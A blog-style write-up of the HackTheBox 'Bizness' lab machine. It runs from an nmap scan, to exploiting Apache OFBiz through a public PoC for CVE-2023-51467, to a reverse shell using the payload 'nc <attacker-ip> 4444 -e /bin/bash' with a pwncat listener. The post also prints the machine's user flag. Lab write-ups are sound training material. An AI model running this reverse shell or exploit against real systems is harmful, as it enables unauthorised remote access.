---
layout: post
title: Bizness HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox easy,linux]
image:
  path: /images/htb/easy/bizness/icon.png
---

Another easy linux box post CTF, let's get cracking!

**Machine created by:** [C4rm3l0](https://app.hackthebox.com/users/458049)

## Recon
I start off my recon by doing a portscan of the IP.

```
$ sudo nmap 10.129.255.102 --top-ports 2500
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-08 18:45 AEDT
Nmap scan report for 10.129.255.102
Host is up (0.31s latency).
Not shown: 2497 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We can see 3 open ports, mainly of interest is HTTP.

I edit my `/etc/hosts` to make a new entry:

```
10.129.255.102 bizness.htb
```

After that I visit [bizness.htb](https://bizness.htb) and see this:

![Front Page](/images/htb/easy/bizness/frontpage.png)

Nothing of particular interest...

`dirstalk` gives 0 results, maybe there's subdomains?

No subdomains from scanning with FFuF, until I notice something in the page footer: `Powered by Apache OFBiz`

Searching for `Apache OFBiz CVE` yields [CVE-2023-50968 (SSRF)](https://nvd.nist.gov/vuln/detail/CVE-2023-50968) and [CVE-2023-51467 (Pre-Auth RCE)](https://nvd.nist.gov/vuln/detail/CVE-2023-51467).

Using a [PoC of the Pre-Auth RCE](https://github.com/JaneMandy/CVE-2023-51467-Exploit/releases/tag/Apache-Ofbiz), I set my URL to `https://bizness.htb/` then used `whoami` to find myself as `ofbiz`, and then using `cat /home/ofbiz/user.txt` to get the user flag.

User Flag: <mark>eff96303c752d6ac896258dd16aa422e</mark>

I setup a listener for a reverse shell:

```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen --host 10.10.***.*** 4444 -m linux
[16:41:53] new listener created for 10.10.***.***:4444
(local) pwncat$
```

Using the payload `nc 10.10.***.*** 4444 -e /bin/bash` with the `print ln to echo` mode triggered the reverse shell!

```
[19:05:59] 10.129.255.102:58820: normalizing shell path
[19:06:03] 10.129.255.102:58820: registered new host w/ db
[19:06:08] listener: 10.10.***.***:4444: linux session from 10.129.255.102:58820
           established
```





![Success](/images/htb/easy/bizness/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.